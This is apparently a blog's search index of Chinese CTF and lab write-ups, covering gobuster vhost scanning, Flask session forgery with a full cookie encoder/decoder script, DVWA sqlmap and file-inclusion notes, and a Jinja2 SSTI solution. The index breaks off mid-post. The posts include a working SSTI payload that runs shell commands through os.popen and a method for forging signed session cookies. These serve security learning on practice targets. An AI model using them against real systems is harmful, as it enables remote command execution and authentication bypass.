<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>关于gobuster的vhost模式下扫描不出虚拟主机的情况</title>
    <link href="/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/"/>
    <url>/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/</url>
    
    <content type="html"><![CDATA[<p>今天在打Tryhackme的Web Enumeration的房间的时候使用gobuster进行虚拟主机扫描的时候发现一直扫不出来正确答案，一直报的都是400状态码的主机。</p><img src="/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/1.png" srcset="/img/loading.gif" lazyload><p>去网上找wp明明命令写的一模一样却不出正确答案，发现他们的gobuster版本和我不太一样，3.5版本的gobuster会有一个append domain的选项，发现是false的。猜测可能是这个的问题。</p><img src="/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/2.png" srcset="/img/loading.gif" lazyload><p>查了一下vhost模式的帮助文档，发现有一个–append-domain的flag可以用，应该就是允许向测试域名中添加字符的意思了，加上测试一下。</p><img src="/2023/06/19/%E5%85%B3%E4%BA%8Egobuster%E7%9A%84vhost%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%AB%E6%8F%8F%E4%B8%8D%E5%87%BA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%83%85%E5%86%B5/3.png" srcset="/img/loading.gif" lazyload><p>这下终于出东西了，算是折腾了一小段时间QAQ。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>flask_session伪造</title>
    <link href="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/"/>
    <url>/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<p>​本篇文章将讲解BUUCTF的[CISCN2019 华东南赛区]Web4，关于flask_session伪造。</p><p>本人能力有限，如有错误，还望各位大佬指正。</p><p>最近打比赛遇到了flask_session伪造相关的题目，没学过，又碰巧随机挑了道BUUCTF的题目正好考的flask_session伪造，看完各位师傅的WP后，进行一次自我总结。</p><p>打开靶机后看到</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/1.png" srcset="/img/loading.gif" lazyload><p>点击后跳转到了百度，</p><p>看一下url</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/2.png" srcset="/img/loading.gif" lazyload><p>感觉像任意文件读取，故进行尝试读取密码</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/3.png" srcset="/img/loading.gif" lazyload><p>真读到了</p><p>那尝试读一下&#x2F;flag</p><p>出现了NO HACK字样</p><p>那么看看能不能读出当前执行的程序&#x2F;proc&#x2F;self&#x2F;cmdline</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/4.png" srcset="/img/loading.gif" lazyload><p>再读一读程序源码&#x2F;app&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding:utf-8</span><br><span class="hljs-keyword">import</span> re, random, uuid, urllib<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! </span><br><span class="hljs-string">@app.route(&#x27;</span>/read<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">def read():</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        url = request.args.get(&#x27;</span>url<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        m = re.findall(&#x27;</span>^file.*<span class="hljs-string">&#x27;, url, re.IGNORECASE)</span><br><span class="hljs-string">        n = re.findall(&#x27;</span>flag<span class="hljs-string">&#x27;, url, re.IGNORECASE)</span><br><span class="hljs-string">        if m or n:</span><br><span class="hljs-string">            return &#x27;</span>No Hack<span class="hljs-string">&#x27;</span><br><span class="hljs-string">        res = urllib.urlopen(url)</span><br><span class="hljs-string">        return res.read()</span><br><span class="hljs-string">    except Exception as ex:</span><br><span class="hljs-string">        print str(ex)</span><br><span class="hljs-string">    return &#x27;</span>no response<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">@app.route(&#x27;</span>/flag<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">def flag():</span><br><span class="hljs-string">    if session and session[&#x27;</span>username<span class="hljs-string">&#x27;] == &#x27;</span>fuck<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">        return open(&#x27;</span>/flag.txt<span class="hljs-string">&#x27;).read()</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        return &#x27;</span>Access denied<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__==&#x27;</span>__main__<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">    app.run(</span><br><span class="hljs-string">        debug=True,</span><br><span class="hljs-string">        host=&quot;0.0.0.0&quot;</span><br><span class="hljs-string">    )</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>&#x2F;read不让读flag,从&#x2F;flag中读的话需要伪造session</p><p>关注到下面这块代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>random.seed()用来设置随机种子，相同的种子就会依照顺序来随机数字。</p><p>uuid.getnode()是用来获取设备地址的,因此我们需要先读取设备网卡的MAC地址再在本地进行session伪造。</p><p>百度了一下linux下设备网卡地址在&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address下</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/5.png" srcset="/img/loading.gif" lazyload><p>读到后将其在python中设置为random.seed(),并random跑一下得到SECRET_KEY</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/6.png" srcset="/img/loading.gif" lazyload><p>注意这里有个坑，目标地址设备是用python2跑的，而我这里是python3,之前我一直用这个当SECRET_KEY,然后一直跑不出flag，百度了一下，python2和python3 random出来的位数是不一样的。（被坑了老长时间了5555555）我这里没装python2，就找了个在线网站跑一下。</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/7.png" srcset="/img/loading.gif" lazyload><p>不过直接python3取9位好像也行。</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/8.png" srcset="/img/loading.gif" lazyload><p>把自己的cookie解密一下看看格式。</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/9.png" srcset="/img/loading.gif" lazyload><p>下面附一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br>__author__ = <span class="hljs-string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><br><span class="hljs-comment"># standard imports</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><span class="hljs-keyword">import</span> ast<br><br><span class="hljs-comment"># Abstract Base Classes (PEP 3119)</span><br><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">3</span>: <span class="hljs-comment"># &lt; 3.0</span><br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Must be using at least Python 3&#x27;</span>)<br><span class="hljs-keyword">elif</span> sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.version_info[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">4</span>: <span class="hljs-comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br>    <span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod<br><span class="hljs-keyword">else</span>: <span class="hljs-comment"># &gt; 3.4</span><br>    <span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABC, abstractmethod<br><br><span class="hljs-comment"># Lib for argument parsing</span><br><span class="hljs-keyword">import</span> argparse<br><br><span class="hljs-comment"># external Imports</span><br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, secret_key</span>):<br>        self.secret_key = secret_key<br><br><br><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.version_info[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">4</span>: <span class="hljs-comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>(metaclass=ABCMeta):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                app = MockApp(secret_key)<br><br>                session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span>(secret_key==<span class="hljs-literal">None</span>):<br>                    compressed = <span class="hljs-literal">False</span><br>                    payload = session_cookie_value<br><br>                    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                        compressed = <span class="hljs-literal">True</span><br>                        payload = payload[<span class="hljs-number">1</span>:]<br><br>                    data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br><br>                    data = base64_decode(data)<br>                    <span class="hljs-keyword">if</span> compressed:<br>                        data = zlib.decompress(data)<br><br>                    <span class="hljs-keyword">return</span> data<br>                <span class="hljs-keyword">else</span>:<br>                    app = MockApp(secret_key)<br><br>                    si = SecureCookieSessionInterface()<br>                    s = si.get_signing_serializer(app)<br><br>                    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><span class="hljs-keyword">else</span>: <span class="hljs-comment"># &gt; 3.4</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>(<span class="hljs-title class_ inherited__">ABC</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                app = MockApp(secret_key)<br><br>                session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span>(secret_key==<span class="hljs-literal">None</span>):<br>                    compressed = <span class="hljs-literal">False</span><br>                    payload = session_cookie_value<br><br>                    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                        compressed = <span class="hljs-literal">True</span><br>                        payload = payload[<span class="hljs-number">1</span>:]<br><br>                    data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br><br>                    data = base64_decode(data)<br>                    <span class="hljs-keyword">if</span> compressed:<br>                        data = zlib.decompress(data)<br><br>                    <span class="hljs-keyword">return</span> data<br>                <span class="hljs-keyword">else</span>:<br>                    app = MockApp(secret_key)<br><br>                    si = SecureCookieSessionInterface()<br>                    s = si.get_signing_serializer(app)<br><br>                    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>                <span class="hljs-keyword">raise</span> e<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># Args are only relevant for __main__ usage</span><br>    <br>    <span class="hljs-comment">## Description for help</span><br>    parser = argparse.ArgumentParser(<br>                description=<span class="hljs-string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,<br>                epilog=<span class="hljs-string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)<br><br>    <span class="hljs-comment">## prepare sub commands</span><br>    subparsers = parser.add_subparsers(<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;sub-command help&#x27;</span>, dest=<span class="hljs-string">&#x27;subcommand&#x27;</span>)<br><br>    <span class="hljs-comment">## create the parser for the encode command</span><br>    parser_encode = subparsers.add_parser(<span class="hljs-string">&#x27;encode&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;encode&#x27;</span>)<br>    parser_encode.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--secret-key&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Secret key&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser_encode.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Session cookie structure&#x27;</span>, required=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">## create the parser for the decode command</span><br>    parser_decode = subparsers.add_parser(<span class="hljs-string">&#x27;decode&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;decode&#x27;</span>)<br>    parser_decode.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>, <span class="hljs-string">&#x27;--secret-key&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Secret key&#x27;</span>, required=<span class="hljs-literal">False</span>)<br>    parser_decode.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>,<br>                                <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Session cookie value&#x27;</span>, required=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">## get args</span><br>    args = parser.parse_args()<br><br>    <span class="hljs-comment">## find the option chosen</span><br>    <span class="hljs-keyword">if</span>(args.subcommand == <span class="hljs-string">&#x27;encode&#x27;</span>):<br>        <span class="hljs-keyword">if</span>(args.secret_key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> args.cookie_structure <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))<br>    <span class="hljs-keyword">elif</span>(args.subcommand == <span class="hljs-string">&#x27;decode&#x27;</span>):<br>        <span class="hljs-keyword">if</span>(args.secret_key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> args.cookie_value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))<br>        <span class="hljs-keyword">elif</span>(args.cookie_value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(FSCM.decode(args.cookie_value))<br></code></pre></td></tr></table></figure><p>可以去github给作者点个star。</p><p>然后我们把改完后的格式({‘username’:b’fuck’})再加密一下得到cookie</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/10.png" srcset="/img/loading.gif" lazyload><p>再把我们的cookie改一下。</p><p>再次访问&#x2F;flag，得到flag</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/11.png" srcset="/img/loading.gif" lazyload>]]></content>
    
    
    
    <tags>
      
      <tag>flask_session伪造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于DVWA无法使用sqlmap进行sql注入测试</title>
    <link href="/2023/04/07/%E5%85%B3%E4%BA%8EDVWA%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/"/>
    <url>/2023/04/07/%E5%85%B3%E4%BA%8EDVWA%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>​    今天在DVWA的SQL注入模块打靶的时候试着sqlmap梭一手，但一直说没有注入点，检查语句啥的都没有什么问题。（真的搞的毛躁了😭！）</p><p>​<a href="https://blog.51cto.com/u_1394444/2500508">参考了这位大佬</a></p><p>​原因是使用localhost当测试地址时，DVWA的安全级别是无法修改的，默认为impossible，导致SQLMAP测试失败。修改成127.0.0.1的测试地址后成功执行。</p><img src="/2023/04/07/%E5%85%B3%E4%BA%8EDVWA%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/1.png" srcset="/img/loading.gif" lazyload>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>远程文件包含时txt文件和php文件的区别</title>
    <link href="/2023/04/05/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%B6txt%E6%96%87%E4%BB%B6%E5%92%8Cphp%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2023/04/05/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%B6txt%E6%96%87%E4%BB%B6%E5%92%8Cphp%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>​    今天在打DVWA的文件包含靶场时(别问为什么学了这么久才开始打这些基础靶，问就是菜😭)，发现远程文件包含时，php文件执行phpinfo()后里面显示的地址是php本地地址，而txt文件执行phpinfo()后才是靶场服务器地址。(虽然应该是个老知识，但我不会，还是记录一下)</p><img src="/2023/04/05/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%B6txt%E6%96%87%E4%BB%B6%E5%92%8Cphp%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/1.png" srcset="/img/loading.gif" lazyload><img src="/2023/04/05/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%B6txt%E6%96%87%E4%BB%B6%E5%92%8Cphp%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/2.png" srcset="/img/loading.gif" lazyload>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFSHOW愚人杯easy_ssti</title>
    <link href="/2023/04/02/problem1/"/>
    <url>/2023/04/02/problem1/</url>
    
    <content type="html"><![CDATA[<p>​</p><p>​    本文记录自己的第一次SSTI成功案例。(很菜，轻喷😭)</p><img src="/2023/04/02/problem1/problem11.jpg" srcset="/img/loading.gif" lazyload><p>打开靶机后没有看到有用的提示，看一下源码。</p><img src="/2023/04/02/problem1/problem12.jpg" srcset="/img/loading.gif" lazyload><p>发现有一个压缩包，下载下来看看。</p><img src="/2023/04/02/problem1/problem13.jpg" srcset="/img/loading.gif" lazyload><p>是flask的模板，分析一下源码应该就是在&#x2F;hello目录下有SSTI注入的漏洞。</p><p>进入hello目录下并照常走一下判断流程，发现应该是jinja2的模板。</p><img src="/2023/04/02/problem1/problem14.jpg" srcset="/img/loading.gif" lazyload><p>放张老图</p><img src="/2023/04/02/problem1/problem15.jpg" srcset="/img/loading.gif" lazyload><p>找一下object</p><img src="/2023/04/02/problem1/problem16.jpg" srcset="/img/loading.gif" lazyload><p>再看看有什么类能用的</p><img src="/2023/04/02/problem1/problem17.jpg" srcset="/img/loading.gif" lazyload><p><a href="https://blog.csdn.net/weixin_58624515/article/details/127991339">这边参考了一位大佬的博客</a></p><p>找catch_warnings，因为catch_warning是function具有__globals__</p><p>然后再通过__globals__里的builtins的__import__来getshell</p><p>os库中可以调用popen函数执行命令，再read读取到页面上。</p><p>在页面上查catch_warning的位置，再查class的位置就能大概查到是第几个类了。</p><p>用ls查了一下当前目录，app.py 里也没啥有用信息，和压缩包里是一样的。</p><img src="/2023/04/02/problem1/problem18.jpg" srcset="/img/loading.gif" lazyload><p>接下来看看templates</p><img src="/2023/04/02/problem1/problem19.jpg" srcset="/img/loading.gif" lazyload><p>发现也是没什么东西。</p><p>那就直接根目录查flag吧。</p>{{''.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /f*').read()}}<img src="/2023/04/02/problem1/problem110.jpg" srcset="/img/loading.gif" lazyload><p>发现not found了</p><p>猜测了一下，应该是将语句中的”&#x2F;“当成目录了。</p><p>那就试试base64+管道符绕过</p><p>“cat 